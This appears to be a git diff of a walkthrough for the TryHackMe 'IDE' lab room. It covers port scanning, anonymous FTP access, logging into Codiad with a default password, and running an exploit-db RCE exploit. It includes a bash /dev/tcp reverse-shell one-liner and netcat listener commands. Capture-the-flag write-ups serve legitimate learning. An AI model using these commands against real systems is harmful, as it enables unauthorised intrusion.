@@ -10,16 +10,20 @@ Table of Contents
 * [FTP login](#FTP-login)
 * [HTTP login](#HTTP-login)
 * [Exploiting HTTP server](#Exploiting-HTTP-server)
+* [Privillege escalation](#Privillege-escalation)
 
 # URL
+
 URL to the IDE room is: https://tryhackme.com/room/ide
 
 # Introduction
+
 IDE is an easy difficulty box intended for further developing enumeration skills.
 The task is to gain shell access on the box and escalate privilleges.
 
 ## Port scan
 I started this room with simple port scan using `nmap`. The command I have used was `sudo nmap -vv -sS -oN -p- initial_scan.txt IP`. Explanation of the used flags is presented below:
+
 ```
 sudo - gives nmap root privilleges.
 -vv - verbosity. Prints out more information about what the nmap scan is doing.
@@ -28,10 +32,13 @@ sudo - gives nmap root privilleges.
 -oN - normal output is redirected to a given filename (in this case - initial_scan.txt).
 IP - IP address of the target machine.
 ```
+
 Finished scan found ***4*** open TCP ports. These ports are: ***21***, ***22***, ***80*** and ***62337***.
 
 ## Further port scan
+
 Now let's do a more throughout scan of these ports with the command `nmap -vv -A -p 21,22,80,62337 -oN open_ports.txt IP`. Expanation for this command is presented below:
+
 ```
 -vv - verbosity. Prints out more information about what the nmap scan is doing.
 -A - aggresive scan options. Enables OS edection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute) flags.
@@ -39,6 +46,7 @@ Now let's do a more throughout scan of these ports with the command `nmap -vv -A
 -oN - normal output is redirected to a given filename (in this case - open_ports.txt).
 IP - IP address of the target machine.
 ```
+
 This scan gave more information about the ports open and services running on top of them. Let's take a look at the newly found information:
 1. Port `21` is running FTP service and it's version `vsftpd 3.0.3`.
 	a. ftp-anon script scan results indicates that Anonymous FTP login is allowed.
@@ -48,6 +56,7 @@ This scan gave more information about the ports open and services running on top
 	a. http-title of this server is Codiad 2.8.4. This specific version of Codiad has a vulnerability which allows Remote Code Execution (RCE) attacks and is a possible attack vector for privillege escalation on this system.
 
 # FTP login
+
 Next I will try anonymous login to the FTP service. The command for connecting to the FTP server is `ftp IP`, where `IP` is IP address of the target machine. When prompted for Username, type `anonymous` and leave the Password field empty.
 When I had logged in to the FTP server, strangely I found no files in here. So I have used the `ls -lah` command for more information and found ***three*** directories here:
 1. `.` and `..` are standard directories on UNIX-like operating systems.
@@ -55,16 +64,40 @@ When I had logged in to the FTP server, strangely I found no files in here. So I
 I went to this directory with `cd` command and found a `-` file, which I have downloaded to host machine with FTP's `GET` command.
 Then I have changed the name of the file from `-` to a `file` and gave it a `.txt` extension.
 After that I have opened the file with a text editor and found a message in here:
+
 ```
 Hey john,
 I have reset the password as you have asked. Please use the default password to login.
 Also, please take care of the image file ;)
 - drac.
 ```
+
 This gives us a couple of usernames - `john` and `drac`. Also, it says that the password for user `john` has been reset and is set to default. Likely, this is the user of the webserver at port `62337`. Well, if the user has default password, it should not be hard to guess it... :)
 
 # HTTP login
+
 So I have logged into the server via `Firefox` browser with the username `john` and password `password` and it opens an web-based ***Codiad 2.8.4*** administration panel with some python scripts. Based on the scripts, this server is used for controlling IP cameras and is the one we need to gain shell access to.
 
 # Exploiting HTTP server
-The specific Codiad version used in this box has a well described remote shell upload vulnerability. That is the exploit I will be using to gain shell access to the box.
+
+The specific Codiad version used in this box has a well described remote shell upload vulnerability, for which the code can be found [on the exploit-db site here](https://www.exploit-db.com/exploits/49705).
+So, I have downloaded this exploit to the attackbox and named it `codiad_exploit.py`. Following parameters needs to be specified for the script to run:
+1. ***URL*** of the webserver.
+2. ***Username*** of the specific user.
+3. ***Password*** of that  user.
+4. ***IP address*** of the attacking machine.
+5. ***Port*** that is used to listen to the reverse shell.
+6. ***Platform*** that is running on the server (Windows or Linux).
+	a. When opened Codiad administration panel within Firefox I found out that the files within the server are located in `/var/www/html` directory, so it can be conducted that this is a Linux host.
+For succesfully running this exploit, ***3 terminal instances*** needs to be used:
+1. In ***the first terminal***, we construct the command used to exploit the server:
+	a. `python3 codiad_exploit.py http://<target-ip>:<target-port> john [REDACTED] <attacker-ip> <listening-port> linux`.
+2. From the exploit instance we gain a reverse shell command to execute on a ***second terminal***.
+	a. Command for this is: `echo `bash -c "bash -i > /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1 2>&1"` | nc -lnvp <listening-port>`.
+3. On the ***third terminal***, we set up a `netcat listener`.
+	a. Command for this is `nc -lnvp <listening-port>+1`.
+After the payload is sent, on the listening terminal we have an access to the target's shell `www-data@ide`.
+
+# Privillege escalation
+
+
